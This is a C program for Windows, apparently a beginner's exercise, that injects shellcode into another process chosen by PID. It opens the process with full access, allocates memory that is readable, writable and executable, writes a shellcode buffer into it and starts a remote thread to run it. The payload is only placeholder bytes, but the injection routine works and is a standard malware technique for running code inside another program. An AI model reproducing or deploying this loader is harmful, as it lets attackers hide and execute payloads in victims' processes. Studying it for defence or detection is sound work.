#include <Windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL; // Handle is an identifier that lets a program interact and control with process/thread
LPVOID rBuffer = NULL; 

unsigned char shellCode[] ="\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[]){ //argc == argument count, argv == argument vector array of strings of input

// Get PID from input arguments
    if(argc < 2){
        printf("%s usage: program.exe <PID>", e);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("%s Getting Handle to Process with ID %ld\n", k, PID);

// Get Handle from PID
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        TRUE,
        PID
    );
    
    if(!hProcess){
        printf("%s Failed to get handle to process with PID %ld, error: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Handle sucessfully accquired\n\\---0x%p\n", k, hProcess);

    // Allocate Bytes to Process Memory where Shell Code will be injected
    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellCode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    printf("%s Sucessfully allocated %zu-bytes with rwx permissions\n", k, sizeof(shellCode));

    // Write to Process Memory
    WriteProcessMemory(
        hProcess,
        rBuffer,
        shellCode,
        sizeof(shellCode),
        NULL
    );
    printf("%s Sucessfully wrote ShellCode: %s (%zu-bytes) to Process Memory\n", k, shellCode, sizeof(shellCode));

    // Create Remote Thread to Run our Payload
    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        0,
        &TID
    );
    if(!hThread){
        printf("%s Failed to create a new thread for PID: %ld, error: %ld\n", e, PID, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s Thread sucessfully created (%ld)\n\\---0x%p\n", k, TID, hThread);

    printf("%s Cleaning Up", i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return EXIT_SUCCESS;
}
